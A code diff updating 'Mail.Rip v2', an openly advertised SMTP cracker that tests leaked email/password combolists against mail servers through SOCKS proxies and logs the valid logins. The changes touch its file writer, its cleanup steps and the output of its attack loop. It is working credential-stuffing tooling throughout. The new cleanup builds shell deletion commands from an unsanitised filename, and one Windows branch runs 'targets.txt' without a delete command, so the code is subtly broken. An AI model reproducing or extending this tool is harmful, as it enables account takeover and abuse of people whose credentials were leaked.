@@ -15,7 +15,7 @@
         +-------------------------------------------------------------------+
         | PROJECT:      Mail.Rip v2                                         |
         | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
-        | RELEASE:      2 (2020-12-27)                                      |
+        | RELEASE:      3 (2021-01-03)                                      |
         | AUTHOR:       DrPython3 @ GitHub.com                              |
         +===================================================================+
         | Based on Mail.Rip v1, this is the new and improvement version.    |
@@ -156,9 +156,14 @@ def writer(text, type):
     '''
     try:
         targetfile = str(str(type) + '.txt')
-        with open(str(targetfile), 'a') as output_file:
-            output_file.write(str(text) + '\n')
-            output_file.close()
+        with open(str(targetfile), 'a+') as output_file:
+            output_file.seek(0)
+            check_empty = output_file.read(100)
+            if len(check_empty) > 0:
+                output_file.write('\n')
+            else:
+                pass
+            output_file.write(str(text))
         return True
     except:
         return False
@@ -337,6 +342,10 @@ def proxysupport():
         socksproxys = open('proxys.txt', 'r').read().splitlines()
         amount_socks = int(len(socksproxys))
         print(colorama.Fore.GREEN + 'Proxys loaded into global list.')
+        if os.name == 'nt':
+            os.system('del proxys.txt')
+        else:
+            os.system('rm proxys.txt')
         return True
     except:
         print(colorama.Fore.RED + 'Loading proxys into global list failed.')
@@ -703,6 +712,16 @@ def comboloader():
                     continue
         # load cleaned combos into global list:
         combos = open('targets.txt', 'r').read().splitlines()
+        # delete old combofiles not needed anymore:
+        try:
+            if os.name =='nt':
+                os.system(f'del {str(input_file)}')
+                os.system('targets.txt')
+            else:
+                os.system(f'rm {str(input_file)}')
+                os.system('rm targets.txt')
+        except:
+            pass
         # get amount of loaded combos:
         result_loader = int(len(combos))
         # return True if at leased one combo has been loaded:
@@ -811,7 +830,7 @@ def attacker():
                                           timeout=default_timeout,
                                           context=sslcontext)
                 print(colorama.Fore.GREEN + f'[{str(attacker_id)}]: SSL-connection established to '
-                      + '{str(target_host)}')
+                      + f'{str(target_host)}')
             except:
                 try:
                     ### on errors try standard connection:
@@ -833,7 +852,7 @@ def attacker():
                         attack.quit()
                     except:
                         pass
-                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)}'
+                    print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} '
                           + 'failed')
                     result_writer = writer(str(next_combo), str('invalid'))
                     fails += 1
@@ -977,7 +996,7 @@ main_logo = '''
             
                                           [0] EXIT MAIL.RIP V2
             
-            #####################################################[v2|R2]
+            #####################################################[v2|R3]
 
 '''
 
@@ -1001,39 +1020,40 @@ def mainmenu():
     elif option == '1':
         status_msg = setdefaults()
         if status_msg == True:
-            input(colorama.Fore.GREEN + 'SUCCESS\n' + '_'*90 + '\nDefault values have been changed.'
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '_'*90 + '\nDefault values have been changed.'
                   + '\nPress [ENTER] to return to main menu')
         else:
-            input(colorama.Fore.RED + 'ERROR\n' + '_'*90 + '\nDefault values have not been changed.'
+            input(colorama.Fore.RED + '\n\nERROR\n' + '_'*90 + '\nDefault values have not been changed.'
                   + '\nPress [ENTER] to return to main menu')
         return None
     # option 2 for setting up proxy-support:
     elif option == '2':
         status_msg = proxysupport()
         if status_msg == True:
-            input(colorama.Fore.GREEN + 'SUCCESS\n' + '_'*90
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '_'*90
                   + f'\nProxy-support is activated using {str(type_socks)} proxys.'
                   + '\nPress [ENTER] to return to main menu')
         else:
-            input(colorama.Fore.RED + 'ERROR\n' + '_'*90 + '\nProxy-support is deactivated.'
+            input(colorama.Fore.RED + '\n\nERROR\n' + '_'*90 + '\nProxy-support is deactivated.'
                   + '\nPress [ENTER] to return to main menu')
         return None
     # option 3 for loading combos for an attack:
     elif option == '3':
         status_msg = comboloader()
         if status_msg == True:
-            input(colorama.Fore.GREEN + 'SUCCESS\n' + '_'*90
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '_'*90
                   + f'\nCombos successfully loaded. Amount: {str(len(combos))}'
                   + '\nPress [ENTER] to return to main menu.')
         else:
-            input(colorama.Fore.RED + 'ERROR\n' + '_'*90 + '\nLoading combos failed.'
+            input(colorama.Fore.RED + '\n\nERROR\n' + '_'*90 + '\nLoading combos failed.'
                   + '\nPress [ENTER] to return to main menu.')
         return None
     # option 4 for starting an attack:
     elif option == '4':
         startattack()
-        input(colorama.Fore.YELLOW + 'INFO\n' + '_'*90
-              + f'\nAttack finished. Hits: {str(hits)}, fails: {str(fails)}'
+        clean()
+        input(colorama.Fore.YELLOW + '\n\nINFO\n' + '_'*90
+              + f'\nFinishing the attack... Hits: {str(hits)}, fails: {str(fails)}'
               + '\nPress [ENTER] to return to main menu')
         return None
     # any other input restarts the mainmenu function:
@@ -1059,4 +1079,4 @@ else:
 while True:
     mainmenu()
 
-# DrPython3 (C) 2020 @ GitHub.com
+# DrPython3 (C) 2021 @ GitHub.com
